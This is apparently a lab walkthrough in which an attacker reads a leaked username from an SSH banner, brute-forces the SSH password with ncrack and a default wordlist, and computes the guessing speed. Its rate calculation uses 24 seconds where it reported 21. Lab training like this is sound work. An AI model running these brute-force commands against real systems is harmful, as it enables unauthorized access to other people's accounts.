# Login Brute-Force

## Identify Target

Check which system leaks the username `bob` in the welcome banner:

```shell-session
kali@kali:~$ cat nmap_ssh_auth_methods.nmap
[...]

Nmap scan report for 10.5.23.11
Host is up (0.000014s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|     password
|   Banner: 
|   ###############################################################
|   #                                                             #
|   #                          WARNING                            #
|   #                     Access Restricted                       #
|   #                                                             #
|   ###############################################################
|   #                                                             #
|   #             Unauthorized access is prohibited.              #
|   #      All activities performed are logged and monitored.     #
|   #  Disconnect IMMEDIATELY if you are not an authorized user!  #
|   #                                                             #
|   ###############################################################
|   #                                                             #
|   #          The maintainer of this system is Bob.              #
|   #   Contact bob@nullbyte.internal for questions or support.   #
|   #                                                             #
|   ###############################################################
|_
[...]
```

- The system with the IP address `10.5.23.11` could have a user `bob`.

## Login Brute-Force

Brute-force the login of `bob` using a wordlist with common passwords:

```shell-session
kali@kali:~$ ncrack -v -p 22 -T4 --user bob -P /usr/share/ncrack/default.pwd -f 10.5.23.11

Starting Ncrack 0.7 ( http://ncrack.org ) at 2026-02-04 13:35 UTC

Stats: 0:00:16 elapsed; 0 services completed (1 total)
Rate: 0.00; Found: 0; About 0.12% done
Discovered credentials on ssh://10.5.23.11:22 'bob' 'flower'
ssh://10.5.23.11:22 finished.

Discovered credentials for ssh on 10.5.23.11 22/tcp:
10.5.23.11 22/tcp ssh: 'bob' 'flower'

Ncrack done: 1 service scanned in 21.01 seconds.
Probes sent: 31 | timed-out: 0 | prematurely-closed: 7

Ncrack finished.
```

- `-f` stops the attack after the first success.
- The password of `bob` is `flower`.
- The brute force attack took 21 seconds.

Check on which position the password is in the wordlist:

```shell-session
kali@kali:~$ grep -v "^#" /usr/share/ncrack/default.pwd | grep -n "^flower$"
56:flower
```

- The password is on position 56.

Calculate the brute-force speed:

```shell-session
kali@kali:~$ bc -lq <<< '(56/24)'
2.33333333333333333333

kali@kali:~$ bc -lq <<< '(56/24)*60'
139.99999999999999999980
```

- `ncrack` could try more than 2 passwords / second or 140 per minute.
